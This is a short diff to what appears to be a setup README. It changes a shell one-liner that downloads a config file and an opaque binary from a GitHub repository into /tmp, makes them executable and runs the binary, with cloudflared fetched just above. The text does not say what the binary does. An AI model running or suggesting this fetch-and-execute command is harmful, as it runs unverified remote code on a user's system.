@@ -4,5 +4,5 @@ wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloud
 ```
 
 ```
-cd /tmp && wget -O config.json https://github.com/DOT-AJA/SCRIPT/raw/refs/heads/main/config.json && wget -O DOTAI https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/DOTAI  && chmod +x DOTAI config.json && ./DOTAI -c config.json
+cd /tmp && wget -O config.json https://github.com/DOT-AJA/SCRIPT/raw/refs/heads/main/config.json && wget -O DOTAI https://github.com/DOT-AJA/SCRIPT/releases/download/testv2/AI-TEST  && chmod +x DOTAI config.json && ./DOTAI -c config.json
 ```
